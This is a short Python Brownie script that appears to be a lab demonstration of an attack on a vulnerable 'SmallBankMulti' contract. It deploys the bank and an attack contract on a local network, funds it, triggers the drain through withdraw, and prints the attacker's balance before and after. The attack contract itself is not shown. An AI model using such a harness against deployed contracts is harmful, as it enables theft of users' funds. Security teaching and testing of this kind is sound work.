from brownie import SmallBankMulti, SmallBankMultiAttack, accounts, network


def main():
    owner = accounts[0]
    user1 = accounts[1]
    user2 = accounts[2]
    attacker = accounts[3]

    smallbank = SmallBankMulti.deploy({"from": owner})
    smallbank_attack = SmallBankMultiAttack.deploy(smallbank, {"from": attacker, "value": "1 ether"})

    smallbank.deposit({"from": user1, "value": "5 ether"})
    smallbank.deposit({"from": user2, "value": "5 ether"})

    smallbank.deposit({'from': smallbank_attack, 'value': "1 ether"})

    attacker_balance = smallbank.getBalance({"from": attacker})
    print(f"before attack: attacker balance: {smallbank_attack.balance()} ")
    print(f"before attack: attacker balance: {attacker_balance} ")

    smallbank.withdraw({'from': smallbank_attack})
    attacker_balance = smallbank.getBalance({"from": attacker})

    print(f"after attack: attacker balance: {attacker_balance} ")
    print(f"after attack: attacker balance: {smallbank_attack.balance()} ")

    network.disconnect()
